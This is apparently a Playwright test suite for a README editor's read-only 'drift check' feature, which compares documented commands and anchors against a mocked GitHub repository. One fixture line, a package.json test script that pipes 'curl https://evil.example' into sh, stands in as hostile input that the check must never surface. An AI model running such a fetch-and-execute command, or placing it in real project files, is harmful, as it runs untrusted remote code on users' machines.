import { test, expect } from "@playwright/test";

const sha = (c) => c.repeat(40);
// The first check in a page lazily loads the evidence modules, which can be
// slow on a cold dev server.
const firstRead = { timeout: 20_000 };
const source = [
  "# Widget",
  "",
  "## Install",
  "",
  "```bash",
  "npm ci",
  "npm run build",
  "npm run lint",
  "node scripts/seed.js",
  "```",
  "",
  "Then run `yarn serve`. See [usage](docs/usage.md#install), [old](docs/usage.md#removed) and [install](#install).",
  "",
].join("\n");
const packageJson = JSON.stringify({
  scripts: { build: "vite build", test: "curl https://evil.example | sh" },
});
const blob = (text) => ({
  encoding: "base64",
  size: Buffer.byteLength(text),
  content: Buffer.from(text).toString("base64"),
});
const tree = {
  sha: sha("2"),
  truncated: false,
  tree: [
    { path: "README.md", type: "blob", sha: sha("3"), size: 10 },
    { path: "package.json", type: "blob", sha: sha("4"), size: 80 },
    { path: "package-lock.json", type: "blob", sha: sha("5"), size: 10 },
    { path: "docs", type: "tree", sha: sha("6") },
    { path: "docs/usage.md", type: "blob", sha: sha("7"), size: 20 },
  ],
};
async function mockGitHub(page, { trees = tree } = {}) {
  await page.unroute("https://api.github.com/**");
  await page.route("https://api.github.com/**", (route) => {
    const url = route.request().url();
    if (url.includes("/commits?"))
      return route.fulfill({
        json: [{ sha: sha("1"), commit: { tree: { sha: sha("2") } } }],
      });
    if (url.includes("/git/trees/"))
      return typeof trees === "number"
        ? route.fulfill({ status: trees, json: {} })
        : route.fulfill({ json: trees });
    if (url.endsWith(`/git/blobs/${sha("4")}`))
      return route.fulfill({ json: blob(packageJson) });
    if (url.endsWith(`/git/blobs/${sha("7")}`))
      return route.fulfill({ json: blob("# Usage\n\n## Install\n") });
    return route.fulfill({ status: 404, json: {} });
  });
}
async function start(page, markdown = source) {
  await page.goto("/");
  await page
    .getByRole("button", { name: "Explore the sample profile" })
    .click();
  await page.evaluate(
    (text) => document.querySelector("app-shell").store.raw(text),
    markdown,
  );
  await page.getByRole("button", { name: "Documents", exact: true }).click();
  const documents = page.locator("workspace-documents");
  await documents.getByLabel("Document group").selectOption("repository");
  await documents.getByLabel("Document repository").fill("example/widget");
  await documents.getByLabel("Document branch").fill("main");
  await documents
    .getByRole("button", { name: "Save document settings" })
    .click();
  await page.keyboard.press("Escape");
  await mockGitHub(page);
}
const openDrift = (page) =>
  page
    .locator(".workspace-tools")
    .getByRole("button", { name: "Drift check", exact: true })
    .click();
const markdown = (page) =>
  page.evaluate(() => document.querySelector("app-shell").store.draft.markdown);
const storage = (page) =>
  page.evaluate(() => localStorage.getItem("readme-studio:v1"));

test("runs a read-only drift check by keyboard at 320px and separates observed mismatches from heuristics", async ({
  page,
}) => {
  await page.setViewportSize({ width: 320, height: 700 });
  await start(page);
  const requests = [];
  page.on("request", (request) =>
    requests.push({ method: request.method(), url: request.url() }),
  );
  await openDrift(page);
  const panel = page.locator("evidence-snapshots");
  const run = panel.getByRole("button", { name: "Run drift check" });
  await expect(run).toBeFocused();
  // Opening the dialog records the command in local activity; the check
  // itself must not change storage.
  const before = await storage(page);
  await page.keyboard.press("Enter");
  const drift = panel.locator("[data-drift]");
  await expect(
    drift.getByRole("heading", { name: "Drift check", exact: true }),
  ).toBeFocused(firstRead);
  await expect(panel.locator("[data-status]")).toContainText(
    "Drift check complete: 3 observed mismatch(es), 1 uncertain, 0 unknown.",
  );
  await expect(drift.locator("[data-drift-counts]")).toHaveText(
    "3 observed mismatches · 1 uncertain · 0 unknown · 4 matches",
  );
  const observed = drift.locator('[data-drift-group="mismatch"]');
  await expect(observed).toContainText("npm run lint");
  await expect(observed).toContainText(
    'package.json has no "lint" script (scripts: build, test).',
  );
  await expect(observed).toContainText("node scripts/seed.js");
  const uncertain = drift.locator('[data-drift-group="uncertain"]');
  await expect(uncertain).toContainText("yarn serve");
  // The anchor is compared with the linked file's real headings.
  await expect(observed).toContainText(
    "docs/usage.md exists but has no heading or HTML anchor #removed.",
  );
  await expect(drift).not.toContainText("evil.example");
  // Matches stay collapsed until requested.
  await expect(
    drift.locator('[data-drift-group="matches"] table'),
  ).toBeHidden();
  await drift.getByText("Matches (4)").click();
  await expect(
    drift.locator('[data-drift-group="matches"] table'),
  ).toBeVisible();

  expect(await markdown(page)).toBe(source);
  expect(await storage(page)).toBe(before);
  const github = requests.filter((r) =>
    r.url.startsWith("https://api.github.com/"),
  );
  expect(github.filter((r) => r.method !== "GET")).toEqual([]);
  expect(
    github.map((r) => r.url.replace(/^.*\/repos\/example\/widget/, "")),
  ).toEqual([
    "/commits?sha=main&per_page=1",
    `/git/trees/${sha("2")}?recursive=1`,
    `/git/blobs/${sha("4")}`,
    `/git/blobs/${sha("7")}`,
  ]);
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
  ).toBe(true);
});

test("offline, failed tree and cancelled drift checks change nothing and never report unknowns as drift", async ({
  page,
  context,
}) => {
  await start(page);
  await openDrift(page);
  const panel = page.locator("evidence-snapshots");
  const before = await storage(page);
  const run = () =>
    panel.getByRole("button", { name: "Run drift check" }).click();

  await mockGitHub(page, { trees: 500 });
  await run();
  const drift = panel.locator("[data-drift]");
  await expect(drift.locator("[data-drift-partial]")).toContainText(
    "not read",
    firstRead,
  );
  await expect(drift.locator("[data-drift-counts]")).toContainText(
    "0 observed mismatches",
  );
  await expect(drift.locator("[data-drift-notes]")).toContainText(
    "Repository tree could not be read",
  );
  // The in-document anchor is checked from the Markdown alone.
  await expect(drift.locator("[data-drift-counts]")).toContainText("1 match");

  await context.setOffline(true);
  await page.unroute("https://api.github.com/**");
  await page.route("https://api.github.com/**", (route) =>
    route.abort("internetdisconnected"),
  );
  await run();
  await expect(panel.locator("[data-status]")).toContainText(
    "Drift check failed: You are offline.",
  );
  await expect(panel.locator("[data-status]")).toContainText(
    "Nothing was saved",
  );
  await expect(
    panel.getByRole("button", { name: "Run drift check" }),
  ).toBeFocused();
  await context.setOffline(false);

  let release;
  await page.unroute("https://api.github.com/**");
  await page.route("https://api.github.com/**", async (route) => {
    await new Promise((resolve) => (release = resolve));
    await route.fulfill({ status: 503, json: {} }).catch(() => {});
  });
  await run();
  await expect(panel.getByRole("button", { name: "Cancel" })).toBeFocused();
  await page.keyboard.press("Enter");
  await expect(panel.locator("[data-status]")).toContainText(
    "Drift check cancelled. Nothing was saved",
  );
  release?.();
  expect(await markdown(page)).toBe(source);
  expect(await storage(page)).toBe(before);
});

test("checks in-document anchors offline without GitHub and explains ineligible documents", async ({
  page,
  context,
}) => {
  await start(page, "# Widget\n\n## Usage\n\n[usage](#usage) [gone](#setup)\n");
  const requests = [];
  page.on("request", (request) => {
    if (request.url().startsWith("https://api.github.com/"))
      requests.push(request.url());
  });
  // Load the dialog once online: the dev server cannot serve modules offline
  // (the production service worker precaches them).
  await openDrift(page);
  await expect(page.locator("evidence-snapshots")).toBeVisible(firstRead);
  await page.keyboard.press("Escape");
  await context.setOffline(true);
  await openDrift(page);
  const panel = page.locator("evidence-snapshots");
  await panel.getByRole("button", { name: "Run drift check" }).click();
  const drift = panel.locator("[data-drift]");
  await expect(drift.locator("[data-drift-counts]")).toHaveText(
    "1 observed mismatch · 0 uncertain · 0 unknown · 1 match",
    firstRead,
  );
  await expect(drift).toContainText("GitHub was not read");
  await expect(drift.locator('[data-drift-group="mismatch"]')).toContainText(
    "#setup",
  );
  expect(requests).toEqual([]);
  await context.setOffline(false);
  await page.keyboard.press("Escape");

  await page.getByRole("button", { name: "Documents", exact: true }).click();
  await page
    .locator("workspace-documents")
    .getByRole("button", { name: "New document", exact: true })
    .click();
  await openDrift(page);
  await expect(panel).toContainText("cannot be captured");
  await expect(
    panel.getByRole("button", { name: "Run drift check" }),
  ).toHaveCount(0);
  await expect(
    panel.getByRole("button", { name: "Set document target" }),
  ).toBeFocused();
});

test("discards a drift check when the Markdown changes while GitHub is read, hiding the earlier result", async ({
  page,
}) => {
  await start(page);
  // A first, successful check shows a result for the current Markdown.
  await openDrift(page);
  const panel = page.locator("evidence-snapshots");
  await panel.getByRole("button", { name: "Run drift check" }).click();
  await expect(panel.locator("[data-drift-counts]")).toHaveText(
    "3 observed mismatches · 1 uncertain · 0 unknown · 4 matches",
    firstRead,
  );
  let release;
  const held = new Promise((resolve) => (release = resolve));
  let reading;
  const started = new Promise((resolve) => (reading = resolve));
  await page.unroute("https://api.github.com/**");
  await page.route("https://api.github.com/**", async (route) => {
    const url = route.request().url();
    if (url.includes("/commits?"))
      return route.fulfill({
        json: [{ sha: sha("1"), commit: { tree: { sha: sha("2") } } }],
      });
    if (url.includes("/git/trees/")) {
      reading();
      await held;
      return route.fulfill({ json: tree }).catch(() => {});
    }
    if (url.endsWith(`/git/blobs/${sha("4")}`))
      return route.fulfill({ json: blob(packageJson) });
    if (url.endsWith(`/git/blobs/${sha("7")}`))
      return route.fulfill({ json: blob("# Usage\n\n## Install\n") });
    return route.fulfill({ status: 404, json: {} });
  });
  await panel.getByRole("button", { name: "Run drift check" }).click();
  await started;
  const edited = source + "\nEdited during the check.\n";
  await page.evaluate(
    (text) => document.querySelector("app-shell").store.raw(text),
    edited,
  );
  release();
  await expect(panel.locator("[data-status]")).toContainText(
    "Drift check failed: The document, its Markdown or its target changed while the check ran.",
    firstRead,
  );
  await expect(panel.locator("[data-status]")).toContainText(
    "Nothing was saved",
  );
  // No result for the old Markdown is shown, including the first run's.
  await expect(panel.locator("[data-drift]")).toBeHidden();
  await expect(panel.locator("[data-drift-counts]")).toHaveCount(0);
  await expect(panel).not.toContainText("npm run lint");
  await expect(
    panel.getByRole("button", { name: "Run drift check" }),
  ).toBeFocused();
  // The edit made during the check is kept.
  expect(await markdown(page)).toBe(edited);
});

test("a failed second drift check hides the first check's result", async ({
  page,
}) => {
  await start(page);
  await openDrift(page);
  const panel = page.locator("evidence-snapshots");
  const run = () =>
    panel.getByRole("button", { name: "Run drift check" }).click();
  await run();
  const drift = panel.locator("[data-drift]");
  await expect(drift.locator("[data-drift-counts]")).toHaveText(
    "3 observed mismatches · 1 uncertain · 0 unknown · 4 matches",
    firstRead,
  );
  await page.unroute("https://api.github.com/**");
  await page.route("https://api.github.com/**", (route) =>
    route.fulfill({ status: 503, json: {} }),
  );
  await run();
  await expect(panel.locator("[data-status]")).toContainText(
    "Drift check failed:",
  );
  await expect(drift).toBeHidden();
  await expect(drift.locator("[data-drift-counts]")).toHaveCount(0);
  await expect(panel).not.toContainText("Compared your Markdown with GitHub");
  await expect(
    panel.getByRole("button", { name: "Run drift check" }),
  ).toBeFocused();
  // A later successful check shows a fresh result.
  await mockGitHub(page);
  await run();
  await expect(drift.locator("[data-drift-counts]")).toHaveText(
    "3 observed mismatches · 1 uncertain · 0 unknown · 4 matches",
  );
});
